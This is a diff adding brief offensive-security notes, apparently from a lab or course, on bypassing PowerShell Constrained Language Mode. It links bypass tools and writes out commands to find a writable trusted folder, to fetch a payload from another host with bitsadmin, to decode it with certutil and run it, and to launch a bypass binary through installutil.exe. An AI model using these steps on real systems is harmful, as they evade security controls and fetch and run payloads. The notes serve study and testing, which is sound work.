@@ -1,0 +1,23 @@
+https://sp00ks-git.github.io/posts/CLM-Bypass/
+https://github.com/calebstewart/bypass-clm/tree/master/bypass-clm
+https://github.com/padovah4ck/PSByPassCLM
+https://github.com/Sh3lldon/FullBypass
+
+Checking Permission
+    $ExecutionContext.SessionState.LanguageMode
+
+Basic Bypass
+    1, Trusted folder
+        icacls.exe C:\Windows\Tasks
+            look for NT AUTHORITY\Authenticated Users:(RX,WD)
+
+When in constraint LanguageMode, directly using powershell cant download the bypass.exe from host machine
+    1, Using base64 obfuscating
+        certutil -encode C:\Bypass.exe normal.txt
+        bitsadmin /Transfer myJob http://192.168.0.0/file.txt C:\Users\student\enc.txt
+        certutil -decode enc.txt Bypass.exe
+        Then run it 
+
+
+Bypass with ps1
+    run the bypass.cs with C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
